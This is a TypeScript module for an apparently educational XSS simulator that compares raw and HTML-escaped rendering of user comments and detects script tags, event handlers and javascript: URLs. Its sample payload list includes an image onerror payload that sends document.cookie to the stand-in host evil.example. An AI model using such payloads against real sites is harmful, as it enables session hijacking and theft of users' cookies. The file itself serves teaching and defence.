import type { SimulatorEngine } from '@core/model';

export type OutputMode = 'raw' | 'escaped';

export function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

export function renderComment(input: string, mode: OutputMode): string {
  return `<p class="comment">${mode === 'escaped' ? escapeHtml(input) : input}</p>`;
}

export interface Verdict {
  executes: boolean;
  /** What would run, for the explanation. */
  code: string;
  vector: 'script tag' | 'event handler' | 'javascript: URL' | null;
}

/**
 * A simplified model of what a browser would execute from this markup. It
 * recognises the three classic vectors; real parsers are far more lenient, which
 * is why escaping output (not filtering input) is the defence.
 */
export function analyse(html: string): Verdict {
  const script = /<script\b[^>]*>([\s\S]*?)<\/script\s*>/i.exec(html);
  if (script) return { executes: true, code: (script[1] ?? '').trim(), vector: 'script tag' };
  const handler = /<[a-z][^>]*\s(on[a-z]+)\s*=\s*("([^"]*)"|'([^']*)'|([^\s>]+))/i.exec(html);
  if (handler)
    return {
      executes: true,
      code: handler[3] ?? handler[4] ?? handler[5] ?? '',
      vector: 'event handler',
    };
  const url = /<[a-z][^>]*\s(?:href|src)\s*=\s*["']?\s*javascript:([^"'>]*)/i.exec(html);
  if (url) return { executes: true, code: (url[1] ?? '').trim(), vector: 'javascript: URL' };
  return { executes: false, code: '', vector: null };
}

export const PAYLOADS: readonly { label: string; value: string }[] = [
  { label: 'Plain text', value: 'Great article, thanks!' },
  { label: 'Bold tag', value: 'This is <b>important</b>' },
  { label: 'Script tag', value: "<script>alert('xss')</script>" },
  {
    label: 'Image onerror',
    value: '<img src=x onerror="fetch(\'//evil.example/?c=\'+document.cookie)">',
  },
];

export interface XssState {
  input: string;
  mode: OutputMode;
}
export type XssAction =
  { type: 'set-input'; value: string } | { type: 'set-mode'; mode: OutputMode };

export const xssEngine: SimulatorEngine<XssState, XssAction> = {
  init: () => ({ input: PAYLOADS[0]?.value ?? '', mode: 'raw' }),
  step: (s) => {
    const i = PAYLOADS.findIndex((p) => p.value === s.input);
    return { ...s, input: PAYLOADS[(i + 1) % PAYLOADS.length]?.value ?? s.input };
  },
  isDone: () => false,
  apply: (s, a) =>
    a.type === 'set-input' ? { ...s, input: a.value.slice(0, 200) } : { ...s, mode: a.mode },
  describe: (s) => {
    const v = analyse(renderComment(s.input, s.mode));
    return v.executes
      ? `${s.mode === 'raw' ? 'Raw' : 'Escaped'} output: a browser would run this ${v.vector ?? ''}: ${v.code}`
      : `${s.mode === 'raw' ? 'Raw' : 'Escaped'} output: shown as text, nothing runs.`;
  },
};
